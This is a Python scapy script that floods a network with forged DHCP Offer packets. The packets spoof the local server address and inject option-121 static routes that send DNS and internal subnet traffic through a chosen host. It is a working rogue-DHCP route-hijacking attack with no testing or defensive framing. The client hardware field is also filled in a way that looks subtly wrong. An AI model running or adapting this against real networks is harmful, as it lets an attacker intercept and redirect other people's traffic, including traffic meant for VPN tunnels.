from scapy.all import *  #noqa
import socket

iface = 'enp5s0'

def create_dhcp_offer(mac, ip_addr, server_ip, subnet_mask, gateway, routes):
    ether = Ether(src=get_if_hwaddr(iface), dst=mac)
    ip = IP(src=server_ip, dst=ip_addr)
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(op=2, htype=1, hlen=6, xid=random.randint(1, 1000000), secs=10, flags=0, ciaddr=0, yiaddr=ip_addr, siaddr=server_ip, giaddr=0, chaddr=mac.encode().ljust(16, b'\x00'))
    dhcp_options = [
        ("message-type", "offer"),
        ("server_id", server_ip),
        ("subnet_mask", subnet_mask),
        ("router", gateway),
        ("lease_time", 86400),
        ("renewal_time", 43200),
        ("rebinding_time", 75600),
        ("end")
    ]
    
    if routes:
      dhcp_options.insert(-1, (121, routes))

    dhcp = DHCP(options=dhcp_options)
    packet = ether/ip/udp/bootp/dhcp
    return packet

def send_dhcp_offer(packet):
    sendp(packet, iface=iface, verbose=False)

def construct_option_121_value(routes):
  option_121_value = b""
  for dest, gateway in routes.items():
    dest_parts = dest.split("/")
    ip_addr = dest_parts[0]
    prefix_len = int(dest_parts[1])

    num_bytes = (prefix_len + 7) // 8
    
    option_121_value += bytes([prefix_len])
    option_121_value += socket.inet_aton(ip_addr)[:num_bytes]
    option_121_value += socket.inet_aton(gateway)
  return option_121_value
  
if __name__ == '__main__':
    client_mac = '1f:9b:38:68:19:f8' 
    client_ip = '192.168.1.201'

    server_ip = '192.168.1.1'
    subnet_mask = '255.255.255.0'
    gateway = '192.168.1.186'
    routes = {
      "8.8.8.8/32": "192.168.1.186",
      "10.1.16.0/22": "192.168.1.186",
      "10.1.20.0/24": "192.168.1.186"
    }
    
    option_121_value = construct_option_121_value(routes)
    
    offer_packet = create_dhcp_offer(client_mac, client_ip, server_ip, subnet_mask, gateway, option_121_value)
    while True:
        send_dhcp_offer(offer_packet)
        print("DHCP Offer with Option 121 sent.")
